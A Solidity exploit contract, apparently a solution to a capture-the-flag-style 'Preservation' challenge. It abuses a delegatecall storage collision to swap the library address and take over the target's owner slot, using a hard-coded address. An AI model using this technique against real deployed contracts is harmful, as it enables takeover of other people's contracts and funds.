// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IPreservation {

function setFirstTime(uint _timeStamp) external;
function setSecondTime(uint _timeStamp) external;
}
contract PreservationAttacker {

    IPreservation public preservation;
    uint256 lala;
    address public  owner;

    constructor(address _preservationImpl) public {
        preservation = IPreservation(_preservationImpl);
    }

    function setAddress1() external {
        preservation.setSecondTime(uint(address(this)));
    }

    function setTime(uint256 _timestamp) external {
        owner = 0xEc948CC31227f0359717c69489cEe7BE7aEFbFD1;
    }

    function attack() external {
        preservation.setFirstTime(uint256(0xEc948CC31227f0359717c69489cEe7BE7aEFbFD1));
    }

    function getUint() external view returns(uint256){
        return uint256(address(this));
    }
}